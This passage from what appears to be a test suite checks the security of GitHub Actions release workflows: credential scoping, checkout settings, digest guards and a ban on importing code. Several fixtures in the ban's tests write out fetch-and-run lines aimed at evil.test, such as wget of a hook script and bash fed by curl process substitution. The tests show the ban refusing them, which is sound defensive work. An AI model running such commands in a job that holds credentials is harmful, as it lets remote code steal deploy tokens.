            `${name}.${id}.steps[${index}] tolerates its own failure`,
          ).toBeUndefined();
        }
      }
    });
  }

  it("release.yml declares no job-level if:, so no job can be silently skipped while its needs are satisfied", () => {
    // `promote` needing `validate`, `gate` and `build` (asserted elsewhere)
    // is a different guarantee from this one: a job-level `if: ${{ false }}`
    // on `promote` still satisfies every other job's `needs`, reports
    // `promote` as "skipped" rather than "failed", and leaves the whole run
    // green while the live promotion silently never happens. `deploy-test.
    // yml` cannot share this exact property -- its `gate` legitimately
    // carries one -- so this stays scoped to `RELEASE`.
    for (const [id, body] of Object.entries(jobs(RELEASE))) {
      expect(asMapping(body, id)["if"], `${RELEASE}.${id} carries a job-level if:`).toBeUndefined();
    }
  });
});

describe("push to main has no untrusted head, and what that does and does not change", () => {
  // `push` to `main` carries no fork and no external contributor: everything
  // reaching this trigger already has write access behind it, which is the
  // one fact `deploy-test.yml`'s `gate` exists to establish about a pull
  // request and does not need to establish here at all -- there is no
  // `HEAD_REPOSITORY` to compare, and nothing for `promote` to re-verify
  // immediately before spending its credential, which is why `promote` below
  // carries `permissions: {}` rather than `deploy-test.yml`'s folded-in
  // `pull-requests: read`. What it does not change is which job may hold the
  // GitOps credential while running repository code: a bad merge or a
  // compromised dependency reaches `main` exactly the way any other commit
  // does, so `promote` still checks out nothing but the GitOps repository,
  // and the source revision it acts on still arrives only as an argument to
  // `git commit`.
  it("declares no fork or same-repository check, and folds no re-verification into promote", () => {
    const gate = jobText(RELEASE, "gate");
    expect(gate).not.toMatch(/HEAD_REPOSITORY|head\.repo\.full_name/);
    expect(job(RELEASE, "promote")["permissions"]).toEqual({});
    const promote = jobText(RELEASE, "promote");
    expect(promote).not.toMatch(/\.state == "open"|any\(\.labels/);
  });

  it("still runs no repository code in the job that holds the credential", () => {
    expect(codeImportOffences(jobScripts(RELEASE, "promote"))).toEqual([]);
  });
});

describe("Release validates and builds before it promotes", () => {
  it("runs the canonical validation on the pushed revision", () => {
    const validate = jobText(RELEASE, "validate");
    expect(validate).toMatch(/npm ci/);
    expect(validate).toMatch(/bash scripts\/validate/);
    // `toContain` only proves `validate` is somewhere in the list; it says
    // nothing about what else is. `needs: [validate, gate, extra_untrusted_
    // job]` on `build` passed this unchanged -- an extra, unasserted
    // dependency widens what has to succeed (or, with the right job,
    // widens what `build` can be made to run alongside) before `build`
    // starts, and nothing here noticed. `promote`'s needs are pinned exactly
    // elsewhere ("gates the promotion on both published digests..."); this
    // closes the same gap for `build`.
    expect(asSequence(job(RELEASE, "build")["needs"]!, "build.needs")).toEqual(["validate", "gate"]);
  });

  it("checks out and installs Node for validate with no extra surface", () => {
    // M-f: `validate`'s checkout and `setup-node` were the last open `with:`
    // blocks in this file -- neither had a closed-key-set test. `validate`
    // runs `npm ci` (lifecycle scripts execute) against whatever the
    // checkout puts on disk, so `submodules: recursive` (external content
    // pulled in from `.gitmodules`) and `persist-credentials: true` (a
    // token left in `.git/config` for anything `npm ci`'s lifecycle scripts
    // run to find) both matter here even though `validate` holds no GitOps
    // credential -- it is still the job every promotion `needs`.
    const checkout = steps(RELEASE, "validate").find(
      (step) => typeof step["uses"] === "string" && step["uses"].startsWith("actions/checkout@"),
    );
    expect(checkout, "validate never checks out the repository").toBeDefined();
    const checkoutWith = withBlock(checkout!, "validate checkout");
    expect(Object.keys(checkoutWith).sort()).toEqual(["fetch-depth", "persist-credentials"]);
    expect(checkoutWith["fetch-depth"]).toBe("0");
    expect(checkoutWith["persist-credentials"]).toBe("false");

    const setupNode = steps(RELEASE, "validate").find(
      (step) => typeof step["uses"] === "string" && step["uses"].startsWith("actions/setup-node@"),
    );
    expect(setupNode, "validate never sets up Node").toBeDefined();
    const setupNodeWith = withBlock(setupNode!, "validate setup-node");
    expect(Object.keys(setupNodeWith)).toEqual(["node-version"]);
  });

  it("reads the digest guard from the pushed SHA, checking nothing out to do it", () => {
    for (const step of steps(RELEASE, "gate")) {
      expect(step["uses"]).toBeUndefined();
    }
    const gate = jobText(RELEASE, "gate");
    expect(gate).toMatch(/github\.sha/);
    expect(gate).toMatch(/contents\/scripts\/update-gitops-digest\.sh\?ref=\$\{SOURCE_SHA\}/);
    expect(gate).toMatch(/grep -qx '#!\/bin\/sh'/);
    expect(gate).toMatch(/\^\[0-9a-f\]\{40\}\$/);
    expect(asMapping(job(RELEASE, "gate")["outputs"]!, "gate.outputs")["guard"]).toBe(
      "${{ steps.verify.outputs.guard }}",
    );
    expect(jobText(RELEASE, "build")).not.toMatch(/needs\.gate\.outputs\.guard|GUARD_CONTENT/);
    expect(jobText(RELEASE, "promote")).toMatch(/needs\.gate\.outputs\.guard/);
  });

  it("checks out the validated revision at the gated SHA without persisting credentials", () => {
    // Unchecked before this: `build`'s own checkout `with:` block had no
    // test at all in this file (DEPLOY_TEST's analogous job has one; Release
    // never did). An added `submodules: recursive` here would fetch
    // `.gitmodules`-named external content into the job that holds
    // `packages: write` and publishes to GHCR, with nothing above noticing.
    const checkout = steps(RELEASE, "build").find(
      (step) => typeof step["uses"] === "string" && step["uses"].startsWith("actions/checkout@"),
    );
    expect(checkout, "build never checks out the repository").toBeDefined();
    const inputs = withBlock(checkout!, "build checkout");
    expect(Object.keys(inputs).sort()).toEqual(["persist-credentials", "ref"]);
    expect(inputs["ref"]).toBe("${{ needs.gate.outputs.source_sha }}");
    expect(inputs["persist-credentials"]).toBe("false");
  });

  it("declares no job-level container or services on build", () => {
    // `build` is uncredentialed for GitOps, but it holds `packages: write` --
    // a container or services entry naming a head-influenced image would run
    // every step of this job, GHCR login and publish included, inside it. The
    // `promote` analogue of this check exists already; `build` never had one.
    const buildJob = job(RELEASE, "build");
    expect(Object.keys(buildJob), "build runs inside a job-level container").not.toContain(
      "container",
    );
    expect(Object.keys(buildJob), "build declares a job-level services container").not.toContain(
      "services",
    );
  });

  it("builds and publishes both images with attestations, and no build argument", () => {
    const build = jobText(RELEASE, "build");
    expect(build).toMatch(/--provenance=mode=min/);
    expect(build).toMatch(/--sbom=true/);
    expect(build).not.toMatch(/--provenance=false/);
    expect(build).toMatch(/ghcr\.io\/hannosirkel\/lousydeal-backend/);
    expect(build).toMatch(/ghcr\.io\/hannosirkel\/lousydeal-storefront/);
    // The images serve either environment, so no per-environment value may be
    // baked in via a build argument -- `--build-arg` is not the *only* way a
    // value could reach `docker buildx build` from outside (`--secret`,
    // `--build-context`, or a file written into the build context all do
    // too), and this file asserts nothing about those. What it does assert:
    // this workflow names no `--build-arg` and bakes in no `NEXT_PUBLIC_`
    // value directly. The broader property -- no environment-specific value
    // reaches the storefront image by any route -- is
    // `storefront/tests/no-next-public-env.test.ts`'s, not this file's.
    expect(source(RELEASE)).not.toMatch(/--build-arg|NEXT_PUBLIC_/);
    const outputs = asMapping(job(RELEASE, "build")["outputs"]!, "build.outputs");
    expect(Object.keys(outputs).sort()).toEqual(["backend_digest", "storefront_digest"]);
  });

  it("guards each published digest against the sentinel's own shape, and never a tag", () => {
    // The row's own verification: a promotion writes a digest matching
    // `^sha256:[0-9a-f]{64}$` and never a tag. This is that property enforced
    // on the *writing* side -- the value extracted from `docker buildx
    // build`'s own metadata is refused, before it is ever handed to
    // `promote`, unless it already has that exact shape.
    expectDigestGuardedAndEmittedUnchanged(publishInvocation(RELEASE).script);
  });

  it("publishes each Dockerfile's final stage, naming no other target", () => {
    expect(
      publishInvocation(RELEASE).invocation,
      `${RELEASE} publishes a named stage, so the Dockerfile assertions describe a different image`,
    ).not.toMatch(/(?:^|\s)--target(?:[=\s]|$)/);
  });

  it("fetches no remote code to execute, though it legitimately runs docker", () => {
    // M-g: `release.yml:57-58` says `build` "holds no GitOps credential",
    // which is true and out of scope for the digest-guard threat model -- but
    // `packages: write` is a credential too, spent in this same job. A step
    // that curls a script and pipes it to `bash` reaches GHCR the same way
    // it would reach `hannosirkel/deploys` from `promote`; nothing before
    // this refused it here. `build` is not held to `codeImportOffences`'s
    // full allowlist -- it legitimately runs `docker buildx build` and
    // `docker login`, both banned outright for `promote` -- only to the
    // narrower ban on fetchers, bare interpreters and misused curl.
    expect(buildRemoteCodeOffences(jobScripts(RELEASE, "build"))).toEqual([]);
  });

  it("gates the promotion on both published digests scanning clean at CRITICAL", () => {
    // T12a deliberately shipped `Deploy Test` with no scan: the test overlay
    // is disposable and re-promoted freely, so gating it on a scanner would
    // block iteration for a finding the environment's own short lifetime
    // already limits the exposure of. Live is not disposable -- it is what
    // the checkbox names "scans" for -- so a CRITICAL, fixable finding in
    // either published image blocks the promotion outright.
    // `ignore-unfixed: true` is what keeps that tolerable: a CRITICAL in a
    // base image with no upstream fix yet would otherwise block every release
    // indefinitely, for a condition nothing in this repository can correct.
    expectTrivyGate(RELEASE, [
      "ghcr.io/hannosirkel/lousydeal-backend@${{ steps.build.outputs.backend_digest }}",
      "ghcr.io/hannosirkel/lousydeal-storefront@${{ steps.build.outputs.storefront_digest }}",
    ]);
    expect(asSequence(job(RELEASE, "promote")["needs"]!, "promote.needs")).toEqual([
      "validate",
      "gate",
      "build",
    ]);
  });
});

describe("Release promotes exactly one overlay, and it is live", () => {
  it("mints a token scoped to the deploys repository alone", () => {
    const promote = jobText(RELEASE, "promote");
    expect(promote).toMatch(/"repositories":\["deploys"\]/);
    expect(promote).toMatch(/::add-mask::/);
    const checkouts = steps(RELEASE, "promote").filter(
      (step) => typeof step["uses"] === "string" && step["uses"].startsWith("actions/checkout@"),
    );
    expect(checkouts, "promote checks out more than one tree").toHaveLength(1);
    const inputs = withBlock(checkouts[0]!, "promote checkout");
    // Closed, not four named reads out of an open mapping: an unasserted
    // fifth key -- `fetch-depth:`, `sparse-checkout:`, `filter:` -- sat
    // beside every one of these checks, entirely outside what any of them
    // could see, in the one job holding a write token for
    // hannosirkel/deploys.
    expect(Object.keys(inputs).sort()).toEqual(["path", "persist-credentials", "repository", "token"]);
    expect(inputs["repository"]).toBe("hannosirkel/deploys");
    expect(inputs["token"]).toBe("${{ steps.app-token.outputs.token }}");
    expect(inputs["path"]).toBe("gitops");
    expect(inputs["persist-credentials"]).toBe("false");
  });

  it("declares only a GitOps checkout, with no container, no services and no revision reference", () => {
    // Narrower than its old title claimed: this reads the declarative
    // surface only -- `uses:`, `container:`, `services:`, any `ref:`, and
    // every `with:` input -- not `run:` script bodies. A step such as `run:
    // git clone … && bash head/hook.sh` would pass every assertion here while
    // running repository code beside the credential; that property is the
    // separate "brings no code into the job" test below, which reads
    // `codeImportOffences` over the scripts themselves.
    const promoteJob = job(RELEASE, "promote");
    expect(Object.keys(promoteJob), "promote runs inside a job-level container").not.toContain(
      "container",
    );
    expect(
      Object.keys(promoteJob),
      "promote declares a job-level services container",
    ).not.toContain("services");
    // `promote` has no downstream job to hand a value to -- `needs: [gate,
    // build]` runs one direction only, and nothing `needs: promote`. A
    // job-level `outputs:` naming `${{ steps.app-token.outputs.token }}`
    // would put the minted GitOps write-token into the run's own job-output
    // surface (visible via the API and to any future job that adds
    // `needs: promote`) with every check above -- container, services,
    // checkout `with:`, `run:` bodies -- still green, because none of them
    // reads this key.
    expect(Object.keys(promoteJob), "promote declares a job-level outputs: block").not.toContain(
      "outputs",
    );

    for (const [index, step] of steps(RELEASE, "promote").entries()) {
      const path = `promote.steps[${index}]`;
      const action = step["uses"];
      if (action !== undefined) {
        expect(asScalar(action, `${path}.uses`), `${path} runs an action other than a checkout`)
          .toMatch(/^actions\/checkout@[0-9a-f]{40}$/);
        expect(
          withBlock(step, path)["repository"],
          `${path} checks out something other than the GitOps repository`,
        ).toBe("hannosirkel/deploys");
      }
      expect(keysOf(step), `${path} names a revision to check out`).not.toContain("ref");
      for (const [key, value] of Object.entries(withBlock(step, path))) {
        expect(
          scalars(value).join("\n"),
          `${path}.with.${key} hands the built revision to an action`,
        ).not.toMatch(/source_sha/);
      }
    }
  });

  it("names the source revision only as an argument to git commit", () => {
    // The same confinement `Deploy Test` gets, for the same reason: the
    // source SHA is a value this job *records*, never one it acts on. A `git
    // checkout "$SOURCE_SHA"` here would be repository code executing beside
    // a write token for hannosirkel/deploys.
    const offending: string[] = [];
    for (const [index, script] of jobScripts(RELEASE, "promote")) {
      for (const command of commands(script)) {
        if (!/source_sha/i.test(command)) continue;
        if (/^git commit -m /.test(command)) continue;
        offending.push(`promote.steps[${index}]: ${command}`);
      }
    }
    expect(offending, "promote acts on the source revision outside its commit message").toEqual(
      [],
    );
  });

  it("brings no code into the job that holds the GitOps credential", () => {
    expect(codeImportOffences(jobScripts(RELEASE, "promote"))).toEqual([]);
  });

  it("runs the guard against the live overlay with both digests", () => {
    const promote = jobText(RELEASE, "promote");
    expect(promote).toMatch(
      /"\$guard" "\$BACKEND_DIGEST" "\$STOREFRONT_DIGEST" "\$GITHUB_WORKSPACE\/gitops\/lousydeal\/overlays\/live"/,
    );
    expect(promote).not.toMatch(/"\$guard".*lousydeal\/overlays\/test/);
  });

  it("stages, validates and commits only the live overlay", () => {
    const promote = jobText(RELEASE, "promote");
    expect(promote).toMatch(/git add lousydeal\/overlays\/live\/kustomization\.yaml/);
    expect(promote).not.toMatch(/git add lousydeal\/overlays\/test\/kustomization\.yaml/);
    expect(promote).not.toMatch(/git add --all|git commit -a\b/);
    expect(promote).not.toMatch(/--force|git rebase/);
  });

  it("stages exactly the live overlay's kustomization and nothing else", () => {
    // M-h: see the identical note on Deploy Test's own version of this
    // check. `git add lousydeal/overlays/live/… lousydeal/overlays/test/…`
    // never contains the literal substring the `not.toMatch` above looks
    // for, so argument order alone defeats it; this pins the staged set
    // positively instead. Covered by the exact-script pin on `promote`'s
    // steps too (see "gate and promote are pinned to their exact expected
    // content"), which is the by-construction version of this same
    // property -- this stays as the property-style check it was, now made
    // to actually hold rather than merely appear to.
    const commit = commitScript(RELEASE);
    const addCommands = commands(commit).filter((line) => /^git add\b/.test(line));
    expect(addCommands, "promote runs more than one git add").toHaveLength(1);
    expect(addCommands[0]).toBe("git add lousydeal/overlays/live/kustomization.yaml");
  });

  it("records the source SHA and both digests in the commit message, and never a PR number", () => {
    expect(jobText(RELEASE, "promote")).toMatch(
      /deploy\(live\): \$\{SOURCE_SHA\} \$\{BACKEND_DIGEST\} \$\{STOREFRONT_DIGEST\}/,
    );
    expect(jobText(RELEASE, "promote")).not.toMatch(/PR_NUMBER|PR #/);
  });

  it("runs the guard before anything is staged, and both overlays render before the push", () => {
    const commit = commitScript(RELEASE);
    const order = (needle: string): number => commit.indexOf(needle);
    const push = order("git push");
    for (const before of [
      "bash lousydeal/tests/manifests.sh",
      "kubectl kustomize lousydeal/overlays/live",
      "kubectl kustomize lousydeal/overlays/test",
      "git diff --check",
      "git diff --cached --check",
    ]) {
      expect(order(before), `${before} must run before git push`).toBeGreaterThanOrEqual(0);
      expect(order(before)).toBeLessThan(push);
    }

    // The guard writes the digest lines, so it has to be a step *earlier*
    // than the one that stages them -- a guard that ran after `git add` would
    // be checking a file the index no longer reflects.
    const scripts = jobScripts(RELEASE, "promote");
    const guardStep = scripts.find(([, body]) => body.includes('"$guard" "$BACKEND_DIGEST"'));
    const commitStep = scripts.find(([, body]) => body.includes("git push"));
    expect(guardStep, "promote never runs the guard").toBeDefined();
    expect(guardStep![0]).toBeLessThan(commitStep![0]);
  });

  it("treats an already-recorded digest pair as nothing to promote", () => {
    // The message is not the behaviour: without the `exit 0` the script falls
    // through to `git commit`, which fails on an empty index and turns a
    // digest-stable merge into a red run. Assert the early exit itself.
    const commit = commitScript(RELEASE);
    expect(commit).toMatch(
      /if \[ -z "\$staged" \]; then\n\s+echo '[^']*nothing to promote'\n\s+exit 0\n\s*fi\n/,
    );
    expect(commit.indexOf("exit 0")).toBeLessThan(commit.indexOf("git commit"));
  });

  it("names no repository or overlay outside lousydeal and deploys", () => {
    const text = source(RELEASE);
    expect(text).not.toMatch(/plepic|servitium/);
    expect(text).not.toMatch(/hannosirkel\/(?!deploys|lousydeal)/);
  });
});

describe("the code-import ban itself", () => {
  // The ban is only as good as what it refuses and what it lets through, and
  // neither is observable from a workflow that happens to be written
  // correctly. These drive it with scripts this repository does not contain.

  /** One `run:` body, in the shape `codeImportOffences` reads. */
  function script(...lines: readonly string[]): Array<readonly [number, string]> {
    return [[0, lines.join("\n")] as const];
  }

  it("refuses a fetch written the way this repository writes git commands", () => {
    // The bypass a subcommand-anchored blacklist has. It matches
    // `git\s+(?:clone|fetch|…)`, which requires the subcommand to follow
    // `git` immediately -- so the `-C <path>` form walks straight past it,
    // and `-C` is the form the guard beside this file uses on every one of
    // its git calls.
    expect(
      codeImportOffences(
        script('git -C gitops fetch origin "pull/1/head"', "git -C gitops checkout FETCH_HEAD"),
      ),
    ).toEqual([
      "steps[0] runs git fetch: git -C gitops fetch origin \"pull/1/head\"",
      "steps[0] runs git checkout: git -C gitops checkout FETCH_HEAD",
    ]);
  });

  it("refuses the same fetch written with an absolute path", () => {
    // A command word is a path, and the allowlist reads the command word. An
    // expression anchored on a bare `git` refuses the line above and admits
    // this one -- the identical invocation, spelled the way someone working
    // around the allowlist would spell it.
    expect(
      codeImportOffences(
        script(
          '/usr/bin/git -C gitops fetch origin "pull/1/head"',
          "./tools/git checkout FETCH_HEAD",
        ),
      ),
    ).toEqual([
      'steps[0] runs git fetch: /usr/bin/git -C gitops fetch origin "pull/1/head"',
      "steps[0] runs git checkout: ./tools/git checkout FETCH_HEAD",
    ]);
  });

  it("accepts the git commands the promoting job actually runs", () => {
    expect(
      codeImportOffences(
        script(
          "git config user.name 'lousydeal-deployer[bot]'",
          "git -C gitops diff --check",
          "git add lousydeal/overlays/test/kustomization.yaml",
          'staged="$(git diff --cached --name-only)"',
          "git commit -m 'deploy(test): …'",
          'git push "https://x-access-token:${APP_TOKEN}@github.com/hannosirkel/deploys.git" HEAD:main',
        ),
      ),
    ).toEqual([]);
  });

  it("refuses a forbidden command hidden behind a shell operator", () => {
    expect(codeImportOffences(script("true && git clone https://example.test/x head"))).toEqual([
      "steps[0] runs git clone: git clone https://example.test/x head",
    ]);
  });

  it("does not fail a script for a comment that mentions a forbidden command", () => {
    // The over-reach a naive substring search has. `promote` deliberately
    // runs no package manager, and saying so beside the script that does not
    // run one must not turn the file red.
    expect(
      codeImportOffences(
        script(
          "# This job installs nothing: no npm install, no docker build, no gh api.",
          "git diff --check",
        ),
      ),
    ).toEqual([]);
  });

  it("refuses a fetcher the old blacklist never named", () => {
    // The blacklist this replaced matched only `curl … | sh|bash|node|
    // python`. `wget` was never in it.
    expect(
      codeImportOffences(script("wget -q -O /tmp/hook.sh https://evil.test/hook.sh")),
    ).toEqual(["steps[0] invokes wget: wget -q -O /tmp/hook.sh https://evil.test/hook.sh"]);
  });

  it("refuses a shell interpreter fed by process substitution, which has no pipe to match", () => {
    // `bash <(curl -s https://evil.test/hook.sh)` contains no `|`, so the old
    // blacklist's `curl … \| sh|bash|…` pattern -- anchored on a pipe -- never
    // matched it at all.
    expect(codeImportOffences(script("bash <(curl -s https://evil.test/hook.sh)"))).toEqual([
      "steps[0] invokes a shell interpreter outside its one allowed shape: bash <(curl -s https://evil.test/hook.sh)",
      "steps[0] uses a short curl flag, which this job's real calls never do: bash <(curl -s https://evil.test/hook.sh)",
    ]);
  });

  it("refuses a fetch staged across separate commands, then executed by path", () => {
    // No single line here combines a fetch with an execution, which is what
    // the old blacklist's single-line pattern needed to fire.
    expect(
      codeImportOffences(
        script(
          'curl -sSLo "$RUNNER_TEMP/x.sh" https://evil.test/hook.sh',
          'chmod +x "$RUNNER_TEMP/x.sh"',
          '"$RUNNER_TEMP/x.sh"',
        ),
      ),
    ).toEqual([
      'steps[0] uses a short curl flag, which this job\'s real calls never do: curl -sSLo "$RUNNER_TEMP/x.sh" https://evil.test/hook.sh',
    ]);
  });

  it("accepts the shell and curl invocations promote actually makes", () => {
    expect(
      codeImportOffences(
        script(
          "bash lousydeal/tests/manifests.sh",
          'pull_request="$(curl --fail --silent --show-error --header "Authorization: Bearer $GITHUB_TOKEN" "https://api.github.com/repos/${REPOSITORY}/pulls/${PR_NUMBER}")"',
        ),
      ),
    ).toEqual([]);
  });

  it("refuses an expression interpolated into a shell script", () => {
    // Driven directly, because no workflow in this repository contains one
    // and a rule with no failing case is a rule nothing has ever exercised.
    expect(
      interpolationOffences([["promote.steps[0]", "echo ${{ github.event.pull_request.title }}"]]),
    ).toEqual(["promote.steps[0]"]);
  });

  it("catches the interpolation even when a folded scalar splits it across lines", () => {
    // `>-` folds a block scalar's lines with a single space, so `${{` and
    // `}}` can sit on two different physical lines of the source file. A
    // single-line grep such as `\$\{\{.*\}\}` cannot span that split; the
    // parser folds the scalar first, so the check below sees one string.
    const folded = asScalar(
      asMapping(
        parseYamlSubset(["if: >-", "  echo ${{", "  github.event.pull_request.title }}", ""].join("\n")),
        "document",
      )["if"]!,
      "if",
    );
    expect(folded).toBe("echo ${{ github.event.pull_request.title }}");
    expect(interpolationOffences([["fixture", folded]])).toEqual(["fixture"]);
  });

  it("accepts the same value passed through env, which is how it is written here", () => {
    expect(interpolationOffences([["promote.steps[0]", 'echo "$COMMIT_MESSAGE"']])).toEqual([]);
  });
});

describe("parseYamlSubset", () => {
  // `scripts/workflows.test.ts` trusts this reader completely -- a parser
  // that silently mis-parsed would make every guarantee above pass while
  // meaning nothing. These drive the reader directly, with sources smaller
  // and stranger than any real workflow in this repository.

  it("keeps a literal block scalar's lines, including ones that look like mapping keys", () => {
    // The mis-parse a naive, line-based reader makes: treating every
    // colon-bearing line as a new key regardless of what block it is inside.
    // `run: |` bodies routinely contain lines like `echo "name: value"` or,
    // as here, a line that is syntactically indistinguishable from a real
    // mapping entry -- the reader must know it is inside a literal block and
    // must not re-interpret its content as structure.
    const parsed = asMapping(
      parseYamlSubset(["run: |", "  set -euo pipefail", "  name: not-a-key", "next: value", ""].join("\n")),
      "document",
    );
    expect(asScalar(parsed["run"]!, "run")).toBe("set -euo pipefail\nname: not-a-key");
    expect(parsed["next"]).toBe("value");
  });

  it("folds a folded block scalar onto one line", () => {
    const parsed = asMapping(
      parseYamlSubset(["if: >-", "  first &&", "  second", "runs-on: ubuntu-24.04", ""].join("\n")),
      "document",
    );
    expect(asScalar(parsed["if"]!, "if")).toBe("first && second");
    expect(parsed["runs-on"]).toBe("ubuntu-24.04");
  });

  it("distinguishes an empty mapping from an absent value", () => {
    // `permissions: {}` (a real, empty grant) and a bare `outputs:` (a key
    // with nothing under it) are different facts; collapsing them would make
    // "the workflow declares no permissions at all" indistinguishable from
    // "the workflow declares an `outputs:` key with nothing in it".
    const parsed = asMapping(
      parseYamlSubset(["permissions: {}", "outputs:", "environment: test", ""].join("\n")),
      "document",
    );
    expect(asMapping(parsed["permissions"]!, "permissions")).toEqual({});
    expect(parsed["outputs"]).toBe("");
    expect(parsed["environment"]).toBe("test");
  });

  it("refuses a duplicate mapping key rather than letting the second win silently", () => {
    expect(() => parseYamlSubset(["a: 1", "a: 2", ""].join("\n"))).toThrow(/duplicate mapping key/);
  });

  it("refuses tab indentation, which YAML does not allow at all", () => {
    expect(() => parseYamlSubset(["a:", "\tb: 2", ""].join("\n"))).toThrow(
      /unsupported tab indentation/,
    );
  });

  it("refuses what it does not understand rather than returning nothing", () => {
    // The reader's central guarantee: silence would mean every assertion
    // above ran against an empty document and passed vacuously. A workflow
    // this cannot parse must fail the suite, not pass it.
    expect(() => parseYamlSubset(["a: {b: c}", ""].join("\n"))).toThrow(/unsupported flow mapping/);
    expect(() => parseYamlSubset(["just a scalar", ""].join("\n"))).toThrow(
      /unsupported mapping entry/,
    );
  });

  it("refuses a second document rather than silently merging it into the first", () => {
    // Merging is the dangerous reading: a second document's `permissions:`
    // would silently overwrite -- or be silently overwritten by -- the
    // first's, with nothing in the parsed result to say so.
    expect(() => parseYamlSubset(["a: 1", "---", "b: 2", ""].join("\n"))).toThrow(
      /unsupported second document/,
    );
  });

  it("refuses a mapping entry indented deeper than its siblings, rather than dropping it", () => {
    // The dangerous shape: silently skipping the line would make `b` vanish
    // from the parsed document instead of failing the suite that reads it --
    // exactly the failure mode the file's own header comment exists to
    // prevent.
    expect(() => parseYamlSubset(["a: 1", "  b: 2", ""].join("\n"))).toThrow(
      /unexpected indentation/,
    );
  });

  it("refuses a sequence item indented deeper than its siblings, rather than dropping it", () => {
    expect(() =>
      parseYamlSubset(["branches:", "  - main", "    - extra", ""].join("\n")),
    ).toThrow(/unexpected indentation/);
  });

  it("refuses trailing content the document root did not account for", () => {
    // Fires when the first content line sits deeper than a later, shallower
    // one: the first line's indent decides the level `document()` reads the
    // whole file at, so a later, less-indented line is trailing, not a
    // sibling to merge in.
    expect(() => parseYamlSubset(["  a: 1", "b: 2", ""].join("\n"))).toThrow(
      /unsupported trailing content/,
    );
  });
});

describe("the narrowing helpers", () => {
  it("refuses a sequence where a mapping is required", () => {
    // Without the `Array.isArray` guard, a sequence is a JavaScript object
    // too (`typeof [] === "object"`, and it is not `null`), so `asMapping`
    // would silently accept one and every `job(...)["permissions"]`-style
    // read downstream would key into it by string, reading `undefined` for
    // every property instead of failing.
    expect(() => asMapping(["a"], "jobs")).toThrow(/jobs is not a mapping/);
  });

  it("throw with the path they were given", () => {
    expect(() => asSequence("a", "steps")).toThrow(/steps is not a sequence/);
    expect(() => asScalar({}, "group")).toThrow(/group is not a scalar/);
  });
});
